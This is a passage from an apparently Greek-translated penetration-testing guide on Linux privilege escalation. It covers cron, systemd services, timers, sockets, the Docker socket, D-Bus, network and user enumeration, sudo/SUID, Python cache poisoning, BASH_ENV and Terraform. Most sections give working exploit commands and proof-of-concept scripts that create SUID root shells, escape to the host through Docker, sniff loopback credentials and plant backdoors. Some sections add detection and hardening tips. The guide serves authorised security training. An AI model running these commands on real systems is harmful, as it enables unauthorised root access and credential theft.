Είναι δυνατό να δημιουργήσεις ένα cronjob **βάζοντας ένα carriage return μετά από ένα comment** (χωρίς newline character), και το cron job θα λειτουργήσει. Παράδειγμα (σημείωσε το carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Για να εντοπίσετε αυτό το είδος stealth εισόδου, ελέγξτε τα cron files με εργαλεία που εμφανίζουν control characters:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Ελέγξτε αν μπορείτε να γράψετε σε οποιοδήποτε αρχείο `.service`, αν μπορείτε, **θα μπορούσατε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor** σας όταν η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **σταματά** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση της μηχανής).\
Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο αρχείο .service με **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Λάβετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής πάνω σε binaries που εκτελούνται από services**, μπορείτε να τα αλλάξετε με backdoors ώστε όταν οι services εκτελεστούν ξανά να εκτελεστούν και τα backdoors.

### systemd PATH - Relative Paths

Μπορείτε να δείτε το PATH που χρησιμοποιείται από το **systemd** με:
```bash
systemctl show-environment
```
Αν διαπιστώσεις ότι μπορείς να **write** σε οποιονδήποτε από τους φακέλους του path, ίσως να μπορέσεις να **escalate privileges**. Πρέπει να ψάξεις για **relative paths being used on service configurations** files όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, create an **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor θα εκτελεστεί** (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).

**Μάθε περισσότερα για services με `man systemd.service`.**

## **Timers**

**Timers** are systemd unit files whose name ends in `**.timer**` that control `**.service**` files or events. **Timers** can be used as an alternative to cron as they have built-in support for calendar time events and monotonic time events and can be run asynchronously.

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι timers

Αν μπορείτε να τροποποιήσετε έναν timer, μπορείτε να τον κάνετε να εκτελέσει κάποια υπάρχοντα του systemd.unit (όπως ένα `.service` ή ένα `.target`)
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι το Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **executing a writable binary**
- Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)

**Μάθετε περισσότερα για timers με `man systemd.timer`.**

### **Enabling Timer**

Για να ενεργοποιήσετε ένα timer χρειάζεστε root privileges και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημείωσε ότι το **timer** **ενεργοποιείται** δημιουργώντας ένα symlink προς αυτό στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Τα Unix Domain Sockets (UDS) επιτρέπουν **επικοινωνία διαδικασιών** σε ίδιες ή διαφορετικές μηχανές μέσα σε client-server μοντέλα. Χρησιμοποιούν τυπικά Unix descriptor files για δια-υπολογιστική επικοινωνία και ρυθμίζονται μέσω `.socket` files.

Τα Sockets μπορούν να ρυθμιστούν χρησιμοποιώντας `.socket` files.

**Μάθε περισσότερα για τα sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές είναι διαφορετικές αλλά συνοπτικά χρησιμοποιούνται για να **δείξουν πού θα ακούει** το socket (το path του AF_UNIX socket file, το IPv4/6 και/ή τον αριθμό port για ακρόαση, κ.λπ.)
- `Accept`: Δέχεται boolean όρισμα. Αν είναι **true**, δημιουργείται ένα **service instance για κάθε εισερχόμενη σύνδεση** και του περνιέται μόνο το connection socket. Αν είναι **false**, όλα τα listening sockets **περνιούνται στο started service unit**, και δημιουργείται μόνο ένα service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου ένα μοναδικό service unit χειρίζεται υποχρεωτικά όλη την εισερχόμενη κίνηση. **Προεπιλογή: false**. Για λόγους απόδοσης, συνιστάται τα νέα daemons να γράφονται μόνο με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Δέχεται μία ή περισσότερες command lines, οι οποίες **εκτελούνται πριν** ή **μετά** τη δημιουργία και το binding των listening **sockets**/FIFOs, αντίστοιχα. Το πρώτο token της command line πρέπει να είναι απόλυτο filename, και μετά να ακολουθούν arguments για το process.
- `ExecStopPre`, `ExecStopPost`: Επιπλέον **commands** που **εκτελούνται πριν** ή **μετά** το κλείσιμο και την αφαίρεση των listening **sockets**/FIFOs, αντίστοιχα.
- `Service`: Καθορίζει το όνομα του **service** unit που θα **ενεργοποιηθεί** από **incoming traffic**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προεπιλογή είναι το service που έχει το ίδιο όνομα με το socket (με την αντικατάσταση του suffix). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να είναι απαραίτητη η χρήση αυτής της επιλογής.

### Writable .socket files

Αν βρεις ένα **writable** `.socket` file, μπορείς να **προσθέσεις** στην αρχή της `[Socket]` section κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, θα χρειαστείς **πιθανότατα να περιμένεις μέχρι να γίνει reboot το μηχάνημα.**\
_Σημείωση ότι το σύστημα πρέπει να χρησιμοποιεί εκείνη τη socket file configuration αλλιώς το backdoor δεν θα εκτελεστεί_

### Socket activation + writable unit path (create missing service)

Μια άλλη misconfiguration υψηλού αντίκτυπου είναι:

- ένα socket unit με `Accept=no` και `Service=<name>.service`
- το referenced service unit λείπει
- ένας attacker μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλο unit search path)

Σε αυτή την περίπτωση, ο attacker μπορεί να δημιουργήσει `<name>.service`, και μετά να προκαλέσει traffic προς το socket ώστε το systemd να φορτώσει και να εκτελέσει το νέο service ως root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Εγγράψιμα sockets

Αν **εντοπίσεις οποιοδήποτε εγγράψιμο socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα config `.socket` files_), τότε **μπορείς να επικοινωνήσεις** με αυτό το socket και ίσως να εκμεταλλευτείς μια ευπάθεια.

### Απαρίθμηση Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν κάποια **sockets που ακούνε για HTTP** αιτήματα (_δεν μιλάω για .socket αρχεία αλλά για τα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Αν το socket **απαντά με ένα HTTP** request, τότε μπορείς να **επικοινωνήσεις** μαζί του και ίσως να **εκμεταλλευτείς κάποια ευπάθεια**.

### Writable Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να είναι ασφαλισμένο. Από προεπιλογή, είναι writable από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή write access σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί μια ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation με Docker CLI**

Αν έχεις write access στο Docker socket, μπορείς να κάνεις privilege escalation χρησιμοποιώντας τις ακόλουθες εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σού επιτρέπουν να εκτελέσεις ένα container με πρόσβαση root-level στο filesystem του host.

#### **Using Docker API Directly**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί να χειριστεί ακόμα μέσω του Docker API και εντολών `curl`.

1.  **List Docker Images:** Ανάκτησε τη λίστα των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλε ένα request για να δημιουργήσεις ένα container που κάνει mount τον root directory του host system.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Ξεκίνα το container που δημιουργήθηκε πρόσφατα:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποίησε το `socat` για να δημιουργήσεις σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού ρυθμίσεις τη σύνδεση `socat`, μπορείς να εκτελείς εντολές απευθείας μέσα στο container με root-level πρόσβαση στο filesystem του host.

### Others

Σημείωσε ότι αν έχεις δικαιώματα εγγραφής πάνω στο docker socket επειδή βρίσκεσαι **μέσα στο group `docker`** έχεις [**περισσότερους τρόπους να κάνεις privilege escalation**](interesting-groups-linux-pe/index.html#docker-group). Αν το [**docker API ακούει σε port** μπορεί επίσης να είναι δυνατό να το compromise](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Δες **περισσότερους τρόπους για να break out από containers ή να abuse container runtimes για να κάνεις privilege escalation** στο:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Αν διαπιστώσεις ότι μπορείς να χρησιμοποιήσεις την εντολή **`ctr`**, διάβασε την παρακάτω σελίδα, καθώς **μπορεί να μπορέσεις να την abuse-άρεις για privilege escalation**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Αν διαπιστώσεις ότι μπορείς να χρησιμοποιήσεις την εντολή **`runc`**, διάβασε την παρακάτω σελίδα, καθώς **μπορεί να μπορέσεις να την abuse-άρεις για privilege escalation**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο **inter-Process Communication (IPC) system** που επιτρέπει σε εφαρμογές να αλληλεπιδρούν αποδοτικά και να μοιράζονται δεδομένα. Σχεδιασμένο με γνώμονα το σύγχρονο Linux system, προσφέρει ένα ισχυρό framework για διαφορετικές μορφές επικοινωνίας εφαρμογών.

Το system είναι ευέλικτο, υποστηρίζοντας βασικό IPC που ενισχύει την ανταλλαγή δεδομένων μεταξύ processes, θυμίζοντας **enhanced UNIX domain sockets**. Επιπλέον, βοηθά στη μετάδοση events ή signals, προωθώντας την απρόσκοπτη ενσωμάτωση μεταξύ system components. Για παράδειγμα, ένα signal από ένα Bluetooth daemon για incoming call μπορεί να κάνει έναν music player να mute, βελτιώνοντας το user experience. Επιπλέον, το D-Bus υποστηρίζει ένα remote object system, απλοποιώντας service requests και method invocations μεταξύ εφαρμογών, και βελτιστοποιώντας processes που παραδοσιακά ήταν σύνθετα.

Το D-Bus λειτουργεί με ένα **allow/deny model**, διαχειριζόμενο message permissions (method calls, signal emissions, etc.) με βάση τη σωρευτική επίδραση των αντίστοιχων policy rules. Αυτές οι policies καθορίζουν αλληλεπιδράσεις με το bus, πιθανώς επιτρέποντας privilege escalation μέσω της εκμετάλλευσης αυτών των permissions.

Ένα παράδειγμα μιας τέτοιας policy στο `/etc/dbus-1/system.d/wpa_supplicant.conf` παρέχεται, και περιγράφει permissions για τον root user να owns, στέλνει προς, και λαμβάνει messages από το `fi.w1.wpa_supplicant1`.

Policies χωρίς καθορισμένο user ή group εφαρμόζονται καθολικά, ενώ οι policies του περιβάλλοντος "default" εφαρμόζονται σε όλα όσα δεν καλύπτονται από άλλες συγκεκριμένες policies.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να κάνετε enumeration και να εκμεταλλευτείτε μια επικοινωνία D-Bus εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Είναι πάντα ενδιαφέρον να κάνετε enumeration του network και να καταλάβετε τη θέση του μηχανήματος.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Γρήγορη triage εξερχόμενου filtering

Αν το host μπορεί να εκτελεί commands αλλά τα callbacks αποτυγχάνουν, ξεχώρισε γρήγορα DNS, transport, proxy και route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ανοιχτές θύρες

Πάντα να ελέγχετε τις υπηρεσίες δικτύου που εκτελούνται στο μηχάνημα και με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτό:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Κατηγοριοποιήστε τους listeners ανά bind target:

- `0.0.0.0` / `[::]`: exposed σε όλες τις local interfaces.
- `127.0.0.1` / `::1`: local-only (καλοί υποψήφιοι για tunnel/forward).
- Συγκεκριμένα internal IPs (π.χ. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): συνήθως reachable μόνο από internal segments.

### Local-only service triage workflow

Όταν compromise έναν host, services bound στο `127.0.0.1` συχνά γίνονται reachable για πρώτη φορά από το shell σας. Ένα γρήγορο local workflow είναι:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS ως network scanner (network-only mode)

Εκτός από local PE checks, το linPEAS μπορεί να εκτελεστεί ως focused network scanner. Χρησιμοποιεί διαθέσιμα binaries στο `$PATH` (συνήθως `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Αν περάσεις `-d`, `-p`, ή `-i` χωρίς `-t`, το linPEAS συμπεριφέρεται ως καθαρός network scanner (παραλείποντας το υπόλοιπο των privilege-escalation checks).

### Sniffing

Έλεγξε αν μπορείς να κάνεις sniff traffic. Αν μπορείς, ίσως μπορέσεις να πάρεις κάποια credentials.
```
timeout 1 tcpdump
```
Γρήγοροι πρακτικοί έλεγχοι:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Το Loopback (`lo`) είναι ιδιαίτερα χρήσιμο στο post-exploitation επειδή πολλές εσωτερικές υπηρεσίες εκθέτουν εκεί tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Καταγράψτε τώρα, αναλύστε αργότερα:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Χρήστες

### Generic Enumeration

Ελέγξτε **ποιος** είστε, ποια **privileges** έχετε, ποιοι **users** υπάρχουν στα συστήματα, ποιοι μπορούν να **login** και ποιοι έχουν **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Ορισμένες εκδόσεις Linux επηρεάστηκαν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να κάνουν privilege escalation. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Groups

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο clipboard (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Αν **γνωρίζεις οποιονδήποτε κωδικό πρόσβασης** του περιβάλλοντος, **δοκίμασε να κάνεις login ως κάθε χρήστης** χρησιμοποιώντας αυτόν τον κωδικό.

### Su Brute

Αν δεν σε νοιάζει να κάνεις πολύ θόρυβο και τα binaries `su` και `timeout` υπάρχουν στον υπολογιστή, μπορείς να δοκιμάσεις brute-force σε χρήστη με το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με το `-a` parameter επίσης προσπαθεί να κάνει brute-force σε users.

## Writable PATH abuses

### $PATH

Αν βρεις ότι μπορείς να **γράφεις μέσα σε κάποιο folder του $PATH**, ίσως μπορέσεις να κάνεις privilege escalation **δημιουργώντας ένα backdoor μέσα στο writable folder** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από έναν folder που βρίσκεται πριν** από το writable folder σου στο $PATH.

### SUDO and SUID

Ίσως σου επιτρέπεται να εκτελέσεις κάποια εντολή χρησιμοποιώντας sudo ή μπορεί να έχουν το suid bit. Έλεγξέ το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Κάποιες **απρόσμενες εντολές επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμα και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του sudo μπορεί να επιτρέπει σε έναν χρήστη να εκτελεί κάποια εντολή με τα δικαιώματα άλλου χρήστη χωρίς να γνωρίζει τον κωδικό.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`, οπότε είναι πλέον τετριμμένο να αποκτήσει κανείς ένα shell προσθέτοντας ένα ssh key μέσα στον root directory ή καλώντας `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιου πράγματος:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στο HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** ώστε να φορτώσει μια αυθαίρετη python library ενώ εκτελούσε το script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

Αν ένα **sudo-allowed Python script** κάνει import ένα module του οποίου ο κατάλογος package περιέχει ένα **writable `__pycache__`**, μπορεί να μπορέσεις να αντικαταστήσεις το cached `.pyc` και να πετύχεις code execution ως ο privileged user στο επόμενο import.

- Γιατί δουλεύει:
- Η CPython αποθηκεύει bytecode caches στο `__pycache__/module.cpython-<ver>.pyc`.
- Ο interpreter ελέγχει το **header** (magic + timestamp/hash metadata δεμένο με το source), και μετά εκτελεί το marshaled code object που βρίσκεται μετά από αυτό το header.
- Αν μπορείς να **delete and recreate** το cached file επειδή ο κατάλογος είναι writable, ένα root-owned αλλά non-writable `.pyc` μπορεί ακόμα να αντικατασταθεί.
- Τυπική διαδρομή:
- `sudo -l` δείχνει ένα Python script ή wrapper που μπορείς να τρέξεις ως root.
- Αυτό το script κάνει import ένα local module από `/opt/app/`, `/usr/local/lib/...`, κ.λπ.
- Το imported module's `__pycache__` directory είναι writable από τον χρήστη σου ή από όλους.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Αν μπορείς να επιθεωρήσεις το privileged script, εντόπισε τα imported modules και το cache path τους:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Ροή abuse:

1. Τρέξε το sudo-allowed script μία φορά ώστε η Python να δημιουργήσει το legit cache file αν δεν υπάρχει ήδη.
2. Διάβασε τα πρώτα 16 bytes από το legit `.pyc` και ξαναχρησιμοποίησέ τα στο poisoned file.
3. Compile ένα payload code object, κάνε `marshal.dumps(...)` σε αυτό, διέγραψε το αρχικό cache file, και ξαναδημιούργησέ το με το original header plus το malicious bytecode.
4. Ξανατρέξε το sudo-allowed script ώστε το import να εκτελέσει το payload σου ως root.

Σημαντικές σημειώσεις:

- Η επαναχρησιμοποίηση του original header είναι το κλειδί επειδή η Python ελέγχει τα cache metadata απέναντι στο source file, όχι αν το bytecode body πραγματικά ταιριάζει με το source.
- Αυτό είναι ιδιαίτερα χρήσιμο όταν το source file ανήκει σε root και δεν είναι writable, αλλά το containing `__pycache__` directory είναι.
- Η attack αποτυγχάνει αν το privileged process χρησιμοποιεί `PYTHONDONTWRITEBYTECODE=1`, κάνει imports από location με safe permissions, ή αφαιρεί write access από κάθε directory στο import path.

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Ensure no directory in the privileged Python import path is writable by low-privileged users, including `__pycache__`.
- For privileged runs, consider `PYTHONDONTWRITEBYTECODE=1` and periodic checks for unexpected writable `__pycache__` directories.
- Treat writable local Python modules and writable cache directories the same way you would treat writable shell scripts or shared libraries executed by root.

### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Why it works: For non-interactive shells, Bash evaluates `$BASH_ENV` and sources that file before running the target script. Many sudo rules allow running a script or a shell wrapper. If `BASH_ENV` is preserved by sudo, your file is sourced with root privileges.

- Requirements:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκλήρυνση:
- Αφαιρέστε το `BASH_ENV` (και το `ENV`) από το `env_keep`, προτιμήστε `env_reset`.
- Αποφύγετε shell wrappers για sudo-allowed commands· χρησιμοποιήστε minimal binaries.
- Εξετάστε το sudo I/O logging και alerting όταν χρησιμοποιούνται preserved env vars.

### Terraform via sudo με preserved HOME (!env_reset)

Αν το sudo αφήνει το environment ανέπαφο (`!env_reset`) ενώ επιτρέπει `terraform apply`, το `$HOME` παραμένει αυτό του calling user. Το Terraform, επομένως, φορτώνει το **$HOME/.terraformrc** ως root και εφαρμόζει το `provider_installation.dev_overrides`.

- Δείξτε το απαιτούμενο provider σε ένα writable directory και τοποθετήστε ένα malicious plugin με το όνομα του provider (π.χ. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
